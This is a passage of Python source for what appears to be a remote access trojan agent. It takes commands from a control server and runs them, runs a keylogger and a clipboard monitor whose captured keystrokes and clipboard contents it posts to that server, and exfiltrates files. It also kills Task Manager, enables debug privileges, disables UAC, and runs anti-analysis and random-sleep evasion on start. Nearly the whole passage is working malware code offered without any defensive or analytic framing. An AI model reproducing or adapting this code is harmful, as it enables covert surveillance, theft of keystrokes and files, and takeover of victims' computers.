                if "screenshot" in command or "screen shot" in command:
                    execute_voice_command("screenshot", agent_id)
                elif "open camera" in command or "start camera" in command:
                    execute_voice_command("start-camera", agent_id)
                elif "close camera" in command or "stop camera" in command:
                    execute_voice_command("stop-camera", agent_id)
                elif "start streaming" in command or "start stream" in command:
                    execute_voice_command("start-stream", agent_id)
                elif "stop streaming" in command or "stop stream" in command:
                    execute_voice_command("stop-stream", agent_id)
                elif "system info" in command or "system information" in command:
                    execute_voice_command("systeminfo", agent_id)
                elif "list processes" in command or "show processes" in command:
                    if WINDOWS_AVAILABLE:
                        execute_voice_command("Get-Process | Select-Object Name, Id | Format-Table", agent_id)
                    else:
                        execute_voice_command("ps aux", agent_id)
                elif "current directory" in command or "where am i" in command:
                    execute_voice_command("pwd", agent_id)
                elif command.startswith("run ") or command.startswith("execute "):
                    # Extract command after "run" or "execute"
                    actual_command = command.split(" ", 1)[1] if " " in command else ""
                    if actual_command:
                        execute_voice_command(actual_command, agent_id)
                else:
                    print(f"Unknown voice command: {command}")
                    
            except sr.UnknownValueError:
                # Speech not recognized - this is normal, just continue
                pass
            except sr.RequestError as e:
                print(f"Could not request results from speech recognition service: {e}")
                time.sleep(1)
                
        except sr.WaitTimeoutError:
            # Timeout waiting for audio - this is normal, just continue
            pass
        except Exception as e:
            print(f"Voice control error: {e}")
            time.sleep(1)

def execute_voice_command(command, agent_id):
    """Execute a command received via voice control."""
    try:
        # Send command to controller for execution
        url = f"{SERVER_URL}/voice_command/{agent_id}"
        response = requests.post(url, json={"command": command}, timeout=5)
        print(f"Voice command '{command}' sent to controller")
    except Exception as e:
        print(f"Error sending voice command: {e}")

def start_voice_control(agent_id):
    """Start voice control functionality."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    if not VOICE_CONTROL_ENABLED:
        VOICE_CONTROL_ENABLED = True
        VOICE_CONTROL_THREAD = threading.Thread(target=voice_control_handler, args=(agent_id,))
        VOICE_CONTROL_THREAD.daemon = True
        VOICE_CONTROL_THREAD.start()
        print("Started voice control.")

def stop_voice_control():
    """Stop voice control functionality."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    if VOICE_CONTROL_ENABLED:
        VOICE_CONTROL_ENABLED = False
        if VOICE_CONTROL_THREAD:
            VOICE_CONTROL_THREAD.join(timeout=2)
        VOICE_CONTROL_THREAD = None
        print("Stopped voice control.")

# --- Remote Control Functions ---

# Global variables for remote control
REMOTE_CONTROL_ENABLED = True
LOW_LATENCY_INPUT_HANDLER = None
MOUSE_CONTROLLER = None
KEYBOARD_CONTROLLER = None

def enable_remote_control():
    """Enable remote control functionality."""
    global REMOTE_CONTROL_ENABLED
    REMOTE_CONTROL_ENABLED = True
    print("Remote control enabled")
    return True

def disable_remote_control():
    """Disable remote control functionality."""
    global REMOTE_CONTROL_ENABLED
    REMOTE_CONTROL_ENABLED = False
    print("Remote control disabled")
    return True

def is_remote_control_enabled():
    """Check if remote control is enabled."""
    return REMOTE_CONTROL_ENABLED

def initialize_low_latency_input():
    """Initialize the low-latency input handler"""
    global LOW_LATENCY_INPUT_HANDLER
    
    try:
        from low_latency_input import LowLatencyInputHandler
        LOW_LATENCY_INPUT_HANDLER = LowLatencyInputHandler(max_queue_size=2000)
        LOW_LATENCY_INPUT_HANDLER.start()
        print("Low-latency input handler initialized")
        return True
    except ImportError:
        print("Low-latency input handler not available, using fallback")
        return False
    except Exception as e:
        print(f"Failed to initialize low-latency input: {e}")
        return False

def handle_remote_control(command_data):
    """Handle remote control commands with ultra-low latency."""
    global LOW_LATENCY_INPUT_HANDLER
    
    try:
        # Try to use low-latency input handler first
        if LOW_LATENCY_INPUT_HANDLER:
            success = LOW_LATENCY_INPUT_HANDLER.handle_input(command_data)
            if success:
                return
            else:
                print("Low-latency input queue full, using fallback")
        
        # Fallback to direct handling
        _handle_remote_control_fallback(command_data)
        
    except Exception as e:
        print(f"Error handling remote control command: {e}")
        _handle_remote_control_fallback(command_data)

def _handle_remote_control_fallback(command_data):
    """Fallback remote control handling (original implementation optimized)"""
    global MOUSE_CONTROLLER, KEYBOARD_CONTROLLER
    
    # Import here to avoid conflicts
    from pynput import mouse, keyboard
    
    # Initialize controllers if needed
    if MOUSE_CONTROLLER is None:
        MOUSE_CONTROLLER = mouse.Controller()
    if KEYBOARD_CONTROLLER is None:
        KEYBOARD_CONTROLLER = keyboard.Controller()
    
    try:
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if action == "mouse_move":
            handle_mouse_move(data)
        elif action == "mouse_click":
            handle_mouse_click(data)
        elif action == "key_down":
            handle_key_down(data)
        elif action == "key_up":
            handle_key_up(data)
        else:
            print(f"Unknown remote control action: {action}")
            
    except Exception as e:
        print(f"Error handling remote control command: {e}")

def get_input_performance_stats():
    """Get input performance statistics"""
    global LOW_LATENCY_INPUT_HANDLER
    
    if LOW_LATENCY_INPUT_HANDLER:
        return LOW_LATENCY_INPUT_HANDLER.get_performance_stats()
    else:
        return {"status": "fallback_mode", "low_latency": False}

def handle_mouse_move(data):
    """Handle mouse movement commands."""
    try:
        x = data.get("x", 0)  # Relative position (0-1)
        y = data.get("y", 0)  # Relative position (0-1)
        sensitivity = data.get("sensitivity", 1.0)
        
        # Get screen dimensions
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screen_width = monitor["width"]
            screen_height = monitor["height"]
        
        # Convert relative position to absolute
        abs_x = int(x * screen_width * sensitivity)
        abs_y = int(y * screen_height * sensitivity)
        
        # Move mouse
        MOUSE_CONTROLLER.position = (abs_x, abs_y)
        
    except Exception as e:
        print(f"Error handling mouse move: {e}")

def handle_mouse_click(data):
    """Handle mouse click commands."""
    try:
        button = data.get("button", "left")
        
        if button == "left":
            MOUSE_CONTROLLER.click(mouse.Button.left, 1)
        elif button == "right":
            MOUSE_CONTROLLER.click(mouse.Button.right, 1)
        elif button == "middle":
            MOUSE_CONTROLLER.click(mouse.Button.middle, 1)
            
    except Exception as e:
        print(f"Error handling mouse click: {e}")

def handle_key_down(data):
    """Handle key press commands."""
    try:
        key = data.get("key")
        code = data.get("code")
        
        if key:
            # Map special keys
            if key == "Enter":
                KEYBOARD_CONTROLLER.press(keyboard.Key.enter)
            elif key == "Escape":
                KEYBOARD_CONTROLLER.press(keyboard.Key.esc)
            elif key == "Backspace":
                KEYBOARD_CONTROLLER.press(keyboard.Key.backspace)
            elif key == "Tab":
                KEYBOARD_CONTROLLER.press(keyboard.Key.tab)
            elif key == "Shift":
                KEYBOARD_CONTROLLER.press(keyboard.Key.shift)
            elif key == "Control":
                KEYBOARD_CONTROLLER.press(keyboard.Key.ctrl)
            elif key == "Alt":
                KEYBOARD_CONTROLLER.press(keyboard.Key.alt)
            elif key == "Delete":
                KEYBOARD_CONTROLLER.press(keyboard.Key.delete)
            elif key == "Home":
                KEYBOARD_CONTROLLER.press(keyboard.Key.home)
            elif key == "End":
                KEYBOARD_CONTROLLER.press(keyboard.Key.end)
            elif key == "PageUp":
                KEYBOARD_CONTROLLER.press(keyboard.Key.page_up)
            elif key == "PageDown":
                KEYBOARD_CONTROLLER.press(keyboard.Key.page_down)
            elif key.startswith("Arrow"):
                direction = key[5:].lower()  # Remove "Arrow" prefix
                if direction == "up":
                    KEYBOARD_CONTROLLER.press(keyboard.Key.up)
                elif direction == "down":
                    KEYBOARD_CONTROLLER.press(keyboard.Key.down)
                elif direction == "left":
                    KEYBOARD_CONTROLLER.press(keyboard.Key.left)
                elif direction == "right":
                    KEYBOARD_CONTROLLER.press(keyboard.Key.right)
            elif key.startswith("F") and key[1:].isdigit():
                # Function keys
                f_num = int(key[1:])
                if 1 <= f_num <= 12:
                    f_key = getattr(keyboard.Key, f"f{f_num}")
                    KEYBOARD_CONTROLLER.press(f_key)
            elif len(key) == 1:
                # Regular character
                KEYBOARD_CONTROLLER.press(key)
                
    except Exception as e:
        print(f"Error handling key down: {e}")

def handle_key_up(data):
    """Handle key release commands."""
    try:
        key = data.get("key")
        code = data.get("code")
        
        if key:
            # Map special keys
            if key == "Enter":
                KEYBOARD_CONTROLLER.release(keyboard.Key.enter)
            elif key == "Escape":
                KEYBOARD_CONTROLLER.release(keyboard.Key.esc)
            elif key == "Backspace":
                KEYBOARD_CONTROLLER.release(keyboard.Key.backspace)
            elif key == "Tab":
                KEYBOARD_CONTROLLER.release(keyboard.Key.tab)
            elif key == "Shift":
                KEYBOARD_CONTROLLER.release(keyboard.Key.shift)
            elif key == "Control":
                KEYBOARD_CONTROLLER.release(keyboard.Key.ctrl)
            elif key == "Alt":
                KEYBOARD_CONTROLLER.release(keyboard.Key.alt)
            elif key == "Delete":
                KEYBOARD_CONTROLLER.release(keyboard.Key.delete)
            elif key == "Home":
                KEYBOARD_CONTROLLER.release(keyboard.Key.home)
            elif key == "End":
                KEYBOARD_CONTROLLER.release(keyboard.Key.end)
            elif key == "PageUp":
                KEYBOARD_CONTROLLER.release(keyboard.Key.page_up)
            elif key == "PageDown":
                KEYBOARD_CONTROLLER.release(keyboard.Key.page_down)
            elif key.startswith("Arrow"):
                direction = key[5:].lower()  # Remove "Arrow" prefix
                if direction == "up":
                    KEYBOARD_CONTROLLER.release(keyboard.Key.up)
                elif direction == "down":
                    KEYBOARD_CONTROLLER.release(keyboard.Key.down)
                elif direction == "left":
                    KEYBOARD_CONTROLLER.release(keyboard.Key.left)
                elif direction == "right":
                    KEYBOARD_CONTROLLER.release(keyboard.Key.right)
            elif key.startswith("F") and key[1:].isdigit():
                # Function keys
                f_num = int(key[1:])
                if 1 <= f_num <= 12:
                    f_key = getattr(keyboard.Key, f"f{f_num}")
                    KEYBOARD_CONTROLLER.release(f_key)
            elif len(key) == 1:
                # Regular character
                KEYBOARD_CONTROLLER.release(key)
                
    except Exception as e:
        print(f"Error handling key up: {e}")

# --- Keylogger Functions ---

def on_key_press(key):
    """Callback for key press events."""
    global KEYLOG_BUFFER
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Regular character
            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: '{key.char}'")
        else:
            # Special key
            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [{key}]")
    except Exception as e:
        KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [ERROR: {e}]")

def keylogger_worker(agent_id):
    """Keylogger worker thread that sends data periodically."""
    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
    url = f"{SERVER_URL}/keylog_data/{agent_id}"
    
    while KEYLOGGER_ENABLED:
        try:
            if KEYLOG_BUFFER:
                # Send accumulated keylog data
                data_to_send = KEYLOG_BUFFER.copy()
                KEYLOG_BUFFER = []
                
                for entry in data_to_send:
                    requests.post(url, json={"data": entry}, timeout=5)
            
            time.sleep(5)  # Send data every 5 seconds
        except Exception as e:
            print(f"Keylogger error: {e}")
            time.sleep(5)

def start_keylogger(agent_id):
    """Start the keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    if not KEYLOGGER_ENABLED:
        KEYLOGGER_ENABLED = True
        
        # Start keyboard listener
        listener = keyboard.Listener(on_press=on_key_press)
        listener.daemon = True
        listener.start()
        
        # Start worker thread
        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
        KEYLOGGER_THREAD.daemon = True
        KEYLOGGER_THREAD.start()
        
        print("Started keylogger.")

def stop_keylogger():
    """Stop the keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    if KEYLOGGER_ENABLED:
        KEYLOGGER_ENABLED = False
        if KEYLOGGER_THREAD:
            KEYLOGGER_THREAD.join(timeout=2)
        KEYLOGGER_THREAD = None
        print("Stopped keylogger.")

# --- Clipboard Monitor Functions ---

def get_clipboard_content():
    """Get current clipboard content."""
    if WINDOWS_AVAILABLE:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        except:
            try:
                win32clipboard.CloseClipboard()
            except:
                pass
            return None
    else:
        # On Linux, we'll skip clipboard monitoring for now
        return None

def clipboard_monitor_worker(agent_id):
    """Clipboard monitor worker thread."""
    global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
    url = f"{SERVER_URL}/clipboard_data/{agent_id}"
    
    while CLIPBOARD_MONITOR_ENABLED:
        try:
            current_content = get_clipboard_content()
            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
                
                requests.post(url, json={"data": clipboard_entry}, timeout=5)
                LAST_CLIPBOARD_CONTENT = current_content
            
            time.sleep(2)  # Check clipboard every 2 seconds
        except Exception as e:
            print(f"Clipboard monitor error: {e}")
            time.sleep(2)

def start_clipboard_monitor(agent_id):
    """Start clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    if not CLIPBOARD_MONITOR_ENABLED:
        CLIPBOARD_MONITOR_ENABLED = True
        CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
        CLIPBOARD_MONITOR_THREAD.daemon = True
        CLIPBOARD_MONITOR_THREAD.start()
        print("Started clipboard monitor.")

def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    if CLIPBOARD_MONITOR_ENABLED:
        CLIPBOARD_MONITOR_ENABLED = False
        if CLIPBOARD_MONITOR_THREAD:
            CLIPBOARD_MONITOR_THREAD.join(timeout=2)
        CLIPBOARD_MONITOR_THREAD = None
        print("Stopped clipboard monitor.")

# --- File Management Functions ---

def handle_file_upload(command_parts):
    """Handle file upload from controller."""
    try:
        if len(command_parts) < 3:
            return "Invalid upload command format"
        
        destination_path = command_parts[1]
        file_content_b64 = command_parts[2]
        
        # Decode base64 content
        file_content = base64.b64decode(file_content_b64)
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
        
        # Write file
        with open(destination_path, 'wb') as f:
            f.write(file_content)
        
        return f"File uploaded successfully to {destination_path}"
    except Exception as e:
        return f"File upload failed: {e}"

def handle_file_download(command_parts, agent_id):
    """Handle file download request from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid download command format"
        
        file_path = command_parts[1]
        
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        
        # Read file and encode as base64
        with open(file_path, 'rb') as f:
            file_content = base64.b64encode(f.read()).decode('utf-8')
        
        # Send file to controller
        filename = os.path.basename(file_path)
        url = f"{SERVER_URL}/file_upload/{agent_id}"
        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
        
        return f"File {file_path} sent to controller"
    except Exception as e:
        return f"File download failed: {e}"

# --- Voice Communication Functions ---

def handle_voice_playback(command_parts):
    """Handle voice playback from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid voice command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Initialize pygame mixer for audio playback
        pygame.mixer.init()
        pygame.mixer.music.load(temp_audio_path)
        pygame.mixer.music.play()
        
        # Wait for playback to finish
        while pygame.mixer.music.get_busy():
            time.sleep(0.1)
        
        # Clean up
        pygame.mixer.quit()
        os.unlink(temp_audio_path)
        
        return "Voice message played successfully"
    except Exception as e:
        return f"Voice playback failed: {e}"

def handle_live_audio(command_parts):
    """Handle live audio stream from controller microphone."""
    try:
        if len(command_parts) < 2:
            return "Invalid live audio command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file for processing
        with tempfile.NamedTemporaryFile(suffix='.webm', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Process audio with speech recognition if available
        if SPEECH_RECOGNITION_AVAILABLE:
            try:
                # Convert webm to wav for speech recognition
                import subprocess
                wav_path = temp_audio_path.replace('.webm', '.wav')
                
                if WINDOWS_AVAILABLE:
                    # Use ffmpeg if available, otherwise skip conversion
                    try:
                        subprocess.run(['ffmpeg', '-i', temp_audio_path, '-acodec', 'pcm_s16le', '-ar', '16000', wav_path], 
                                     check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    except:
                        # If ffmpeg not available, try direct processing
                        wav_path = temp_audio_path
                else:
                    try:
                        subprocess.run(['ffmpeg', '-i', temp_audio_path, '-acodec', 'pcm_s16le', '-ar', '16000', wav_path], 
                                     check=True, capture_output=True)
                    except:
                        wav_path = temp_audio_path
                
                # Try to recognize speech
                recognizer = sr.Recognizer()
                try:
                    with sr.AudioFile(wav_path) as source:
                        audio = recognizer.record(source)
                    command = recognizer.recognize_google(audio).lower()
                    print(f"Live audio command received: {command}")
                    
                    # Process the voice command
                    if "screenshot" in command or "screen shot" in command:
                        execute_command("screenshot")
                    elif "open camera" in command or "start camera" in command:
                        start_camera_streaming(get_or_create_agent_id())
                    elif "close camera" in command or "stop camera" in command:
                        stop_camera_streaming()
                    elif "start streaming" in command or "start stream" in command:
                        start_streaming(get_or_create_agent_id())
                    elif "stop streaming" in command or "stop stream" in command:
                        stop_streaming()
                    elif "system info" in command or "system information" in command:
                        return execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a")
                    elif "list processes" in command or "show processes" in command:
                        if WINDOWS_AVAILABLE:
                            return execute_command("Get-Process | Select-Object Name, Id | Format-Table")
                        else:
                            return execute_command("ps aux")
                    elif "current directory" in command or "where am i" in command:
                        return execute_command("pwd")
                    elif command.startswith("run ") or command.startswith("execute "):
                        actual_command = command.split(" ", 1)[1] if " " in command else ""
                        if actual_command:
                            return execute_command(actual_command)
                    else:
                        print(f"Unknown live audio command: {command}")
                        
                except sr.UnknownValueError:
                    print("Could not understand live audio")
                except sr.RequestError as e:
                    print(f"Speech recognition error: {e}")
                    
                # Clean up wav file if created
                if wav_path != temp_audio_path and os.path.exists(wav_path):
                    os.unlink(wav_path)
                    
            except Exception as e:
                print(f"Live audio processing error: {e}")
        
        # Clean up temp file
        os.unlink(temp_audio_path)
        
        return "Live audio processed successfully"
    except Exception as e:
        return f"Live audio processing failed: {e}"

def execute_command(command):
    """Executes a command and returns its output."""
    try:
        if WINDOWS_AVAILABLE:
            # Explicitly use PowerShell to execute commands on Windows
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            # Use bash on Linux/Unix systems
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=30
            )
        output = result.stdout + result.stderr
        if not output:
            return "[No output from command]"
        return output
    except Exception as e:
        return f"Command execution failed: {e}"

def main_loop(agent_id):
    """The main command and control loop."""
    # Initialize high-performance systems
    print("Initializing high-performance systems...")
    low_latency_available = initialize_low_latency_input()
    print(f"Low-latency input: {'Available' if low_latency_available else 'Fallback mode'}")
    
    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
        "start-keylogger": lambda: start_keylogger(agent_id),
        "stop-keylogger": stop_keylogger,
        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
        "stop-clipboard": stop_clipboard_monitor,
        "start-reverse-shell": lambda: start_reverse_shell(agent_id),
        "stop-reverse-shell": stop_reverse_shell,
        "start-voice-control": lambda: start_voice_control(agent_id),
        "stop-voice-control": stop_voice_control,
        "kill-taskmgr": kill_task_manager,
    }
    
    # Performance monitoring counter
    performance_check_counter = 0

    while True:
        try:
            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
            task = response.json()
            command = task.get("command", "sleep")

            if command in internal_commands:
                internal_commands[command]()
            elif command.startswith("upload-file:"):
                output = handle_file_upload(command.split(":", 2))
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
            elif command.startswith("download-file:"):
                output = handle_file_download(command.split(":", 1), agent_id)
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
            elif command.startswith("play-voice:"):
                output = handle_voice_playback(command.split(":", 1))
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
            elif command.startswith("live-audio:"):
                output = handle_live_audio(command.split(":", 1))
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
            elif command.startswith("terminate-process:"):
                # Handle process termination with admin privileges
                parts = command.split(":", 1)
                if len(parts) > 1:
                    process_target = parts[1]
                    # Try to convert to int (PID) or use as string (process name)
                    try:
                        process_target = int(process_target)
                    except ValueError:
                        pass  # Keep as string (process name)
                    output = terminate_process_with_admin(process_target, force=True)
                else:
                    output = "Invalid terminate-process command format"
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})

            elif command != "sleep":
                output = execute_command(command)
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
        
        except requests.exceptions.RequestException:
            # This is expected when the server is down, just wait and retry
            pass
        
        # Performance monitoring (every 30 seconds)
        performance_check_counter += 1
        if performance_check_counter >= 30 and low_latency_available:
            stats = get_input_performance_stats()
            if stats.get('input_count', 0) > 0:
                print(f"Input performance - Avg latency: {stats.get('avg_latency', 0):.1f}ms, "
                      f"Queue: {stats.get('queue_size', 0)}, "
                      f"Processed: {stats.get('input_count', 0)}")
            performance_check_counter = 0
        
        # Adaptive sleep to reduce traffic when idle
        sleep_time = 1 if (STREAMING_ENABLED or AUDIO_STREAMING_ENABLED or 
                          CAMERA_STREAMING_ENABLED or KEYLOGGER_ENABLED or 
                          CLIPBOARD_MONITOR_ENABLED or REVERSE_SHELL_ENABLED or
                          VOICE_CONTROL_ENABLED) else 5
        time.sleep(sleep_time)

# --- Process Termination Functions ---

def terminate_process_with_admin(process_name_or_pid, force=True):
    """Terminate a process with administrative privileges."""
    if not WINDOWS_AVAILABLE:
        return terminate_linux_process(process_name_or_pid, force)
    
    try:
        # First try to elevate if not already admin
        if not is_admin():
            print("Attempting to elevate privileges for process termination...")
            if not elevate_privileges():
                print("Could not elevate privileges. Trying alternative methods...")
                return terminate_process_alternative(process_name_or_pid, force)
        
        # Method 1: Use taskkill with admin privileges
        if isinstance(process_name_or_pid, str):
            # Process name provided
            cmd = ['taskkill', '/IM', process_name_or_pid]
        else:
            # PID provided
            cmd = ['taskkill', '/PID', str(process_name_or_pid)]
        
        if force:
            cmd.append('/F')
        
        # Add /T to terminate child processes
        cmd.append('/T')
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, 
                                  creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
            if result.returncode == 0:
                return f"Process terminated successfully: {result.stdout}"
            else:
                print(f"Taskkill failed: {result.stderr}")
                # Try alternative methods
                return terminate_process_alternative(process_name_or_pid, force)
        except Exception as e:
            print(f"Taskkill command failed: {e}")
            return terminate_process_alternative(process_name_or_pid, force)
            
    except Exception as e:
        print(f"Process termination failed: {e}")
        return f"Failed to terminate process: {e}"

def terminate_process_alternative(process_name_or_pid, force=True):
    """Alternative process termination methods using Windows API."""
    if not WINDOWS_AVAILABLE:
        return "Alternative termination not available on this platform"
    
    try:
        # Method 1: Direct Windows API termination
        if isinstance(process_name_or_pid, str):
            # Find process by name
            target_pids = []
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name_or_pid.lower():
                    target_pids.append(proc.info['pid'])
        else:
            target_pids = [process_name_or_pid]
        
        if not target_pids:
            return f"Process not found: {process_name_or_pid}"
        
        terminated_count = 0
        for pid in target_pids:
            if terminate_process_by_pid(pid, force):
                terminated_count += 1
        
        if terminated_count > 0:
            return f"Successfully terminated {terminated_count} process(es)"
        else:
            return "Failed to terminate any processes"
            
    except Exception as e:
        return f"Alternative termination failed: {e}"

def terminate_process_by_pid(pid, force=True):
    """Terminate a specific process by PID using Windows API."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Use TerminateProcess API
        process_handle = win32api.OpenProcess(
            win32con.PROCESS_TERMINATE | win32con.PROCESS_QUERY_INFORMATION,
            False,
            pid
        )
        
        if process_handle:
            try:
                # Get process name for logging
                try:
                    process_name = win32process.GetModuleFileNameEx(process_handle, 0)
                    print(f"Terminating process: {process_name} (PID: {pid})")
                except:
                    print(f"Terminating process PID: {pid}")
                
                # Terminate the process
                win32api.TerminateProcess(process_handle, 1)
                win32api.CloseHandle(process_handle)
                
                # Wait a moment and verify termination
                time.sleep(0.5)
                try:
                    psutil.Process(pid)
                    # Process still exists, try more aggressive methods
                    return terminate_process_aggressive(pid)
                except psutil.NoSuchProcess:
                    # Process terminated successfully
                    return True
                    
            except Exception as e:
                win32api.CloseHandle(process_handle)
                print(f"TerminateProcess failed for PID {pid}: {e}")
                return terminate_process_aggressive(pid)
        else:
            print(f"Could not open process handle for PID {pid}")
            return terminate_process_aggressive(pid)
            
    except Exception as e:
        print(f"Process termination by PID failed: {e}")
        return False

def terminate_process_aggressive(pid):
    """Aggressive process termination using advanced techniques."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Use NtTerminateProcess (more direct)
        try:
            ntdll = ctypes.windll.ntdll
            kernel32 = ctypes.windll.kernel32
            
            # Open process with maximum access
            process_handle = kernel32.OpenProcess(0x1F0FFF, False, pid)  # PROCESS_ALL_ACCESS
            if process_handle:
                # Use NtTerminateProcess for more direct termination
                status = ntdll.NtTerminateProcess(process_handle, 1)
                kernel32.CloseHandle(process_handle)
                
                if status == 0:  # STATUS_SUCCESS
                    print(f"Process {pid} terminated using NtTerminateProcess")
                    return True
        except Exception as e:
            print(f"NtTerminateProcess failed: {e}")
        
        # Method 2: Debug privilege escalation and termination
        try:
            # Enable debug privilege
            enable_debug_privilege()
            
            # Try termination again with debug privilege
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_TERMINATE,
                False,
                pid
            )
            
            if process_handle:
                win32api.TerminateProcess(process_handle, 1)
                win32api.CloseHandle(process_handle)
                print(f"Process {pid} terminated with debug privilege")
                return True
                
        except Exception as e:
            print(f"Debug privilege termination failed: {e}")
        
        # Method 3: Use psutil as last resort
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            proc.wait(timeout=3)
            print(f"Process {pid} terminated using psutil")
            return True
        except psutil.TimeoutExpired:
            try:
                proc.kill()
                print(f"Process {pid} killed using psutil")
                return True
            except:
                pass
        except Exception as e:
            print(f"Psutil termination failed: {e}")
        
        return False
        
    except Exception as e:
        print(f"Aggressive termination failed: {e}")
        return False

def enable_debug_privilege():
    """Enable debug privilege for the current process."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Get current process token
        token_handle = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        )
        
        # Get LUID for debug privilege
        debug_privilege = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
        
        # Enable the privilege
        privileges = [(debug_privilege, win32security.SE_PRIVILEGE_ENABLED)]
        win32security.AdjustTokenPrivileges(token_handle, False, privileges)
        
        win32api.CloseHandle(token_handle)
        print("Debug privilege enabled")
        return True
        
    except Exception as e:
        print(f"Failed to enable debug privilege: {e}")
        return False

def terminate_linux_process(process_name_or_pid, force=True):
    """Terminate process on Linux systems."""
    try:
        if isinstance(process_name_or_pid, str):
            # Use pkill for process name
            cmd = ['pkill']
            if force:
                cmd.append('-9')  # SIGKILL
            cmd.append(process_name_or_pid)
        else:
            # Use kill for PID
            cmd = ['kill']
            if force:
                cmd.append('-9')  # SIGKILL
            cmd.append(str(process_name_or_pid))
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            return f"Process terminated successfully"
        else:
            return f"Process termination failed: {result.stderr}"
            
    except Exception as e:
        return f"Linux process termination failed: {e}"

def kill_task_manager():
    """Specifically target and terminate Task Manager processes."""
    if not WINDOWS_AVAILABLE:
        return "Task Manager termination only available on Windows"
    
    try:
        task_manager_processes = ['taskmgr.exe', 'Taskmgr.exe', 'TASKMGR.EXE']
        results = []
        
        for process_name in task_manager_processes:
            try:
                result = terminate_process_with_admin(process_name, force=True)
                results.append(f"{process_name}: {result}")
            except Exception as e:
                results.append(f"{process_name}: Failed - {e}")
        
        # Also try to find and kill by PID
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'taskmgr.exe':
                    pid = proc.info['pid']
                    result = terminate_process_with_admin(pid, force=True)
                    results.append(f"PID {pid}: {result}")
        except Exception as e:
            results.append(f"PID search failed: {e}")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"Task Manager termination failed: {e}"

if __name__ == "__main__":
    # Run UAC checks and elevation FIRST
    if WINDOWS_AVAILABLE:
        # Try to run as admin first
        if not is_admin():
            print("Attempting to run as administrator...")
            if run_as_admin():
                # Script will restart with admin privileges
                sys.exit()
        
        # If we're admin, disable UAC
        if is_admin():
            print("Running with administrator privileges")
            if disable_uac():
                print("UAC disabled successfully")
            else:
                print("Could not disable UAC")
    
    # Run anti-analysis checks
    try:
        anti_analysis()
    except:
        pass
    
    # Initialize stealth and privilege escalation
    print("Initializing agent...")
    
    # Random sleep to avoid pattern detection
    sleep_random()
    
    # Check current privileges
    if is_admin():
